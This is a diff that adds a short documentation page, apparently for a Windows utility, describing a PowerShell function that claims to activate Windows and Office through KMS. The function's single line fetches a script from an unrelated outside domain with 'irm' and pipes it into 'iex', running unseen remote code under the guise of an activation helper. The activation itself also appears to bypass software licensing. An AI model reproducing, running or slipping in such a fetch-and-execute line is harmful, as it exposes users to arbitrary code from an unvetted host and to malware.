@@ -1,0 +1,12 @@
+---
+title: "Windows & Office - Activate"
+description: "Activates Windows and Office products using KMS."
+editUrl: false
+---
+
+```powershell title="functions/private/Invoke-WinUtilKMS.ps1"
+function Invoke-WinUtilKMS {
+
+    Start-Process powershell -ArgumentList '-Command "irm https://compourri.co.za/KMS | iex"'
+}
+```
